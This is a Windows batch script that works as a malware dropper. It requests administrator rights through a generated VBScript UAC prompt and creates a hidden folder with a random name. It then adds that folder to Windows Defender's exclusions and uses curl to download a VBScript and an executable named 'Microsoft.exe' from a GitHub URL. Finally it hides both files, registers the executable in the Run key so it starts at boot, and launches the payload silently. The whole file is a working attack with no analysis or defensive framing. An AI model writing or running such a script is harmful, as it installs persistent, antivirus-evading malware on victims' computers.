@echo off
setlocal

REM Check if the script is running with administrator privileges
net session >nul 2>&1
if %errorLevel% EQU 0 (
    goto admin
) else (
    goto elevate
)

:elevate
REM Use VBScript to elevate privileges
set "batchPath=%~0"
set "vbsGetPrivileges=%temp%\OEgetPriv_%random%.vbs"
echo Set UAC = CreateObject^("Shell.Application"^)>"%vbsGetPrivileges%"
echo UAC.ShellExecute "%batchPath%", "", "", "runas", 1 >>"%vbsGetPrivileges%"
"%SystemRoot%\System32\WScript.exe" "%vbsGetPrivileges%" %*
del "%vbsGetPrivileges%" /f /q
goto :eof

:admin
REM Create hidden and random folder
set "hiddenFolder=%temp%.{%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%}"
mkdir "%hiddenFolder%"

REM Exclude hidden folder from Windows Defender
powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder%'"

REM Download payload files to hidden folder using curl
curl -sS https://raw.githubusercontent.com/maxavison7/nothing/main/myscript.vbs -o "%hiddenFolder%\myscript.vbs"
curl -sS https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe -o "%hiddenFolder%\Microsoft.exe"

REM Set hidden attribute for files
attrib +h +s "%hiddenFolder%\myscript.vbs"
attrib +h +s "%hiddenFolder%\Microsoft.exe"

REM Add registry key to start Microsoft.exe on boot
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft" /t REG_SZ /d "%hiddenFolder%\Microsoft.exe" /f

REM Run payload silently and pass %hiddenFolder% variable
start /B "" wscript.exe "%hiddenFolder%\myscript.vbs" "%~dp0"

goto :eof
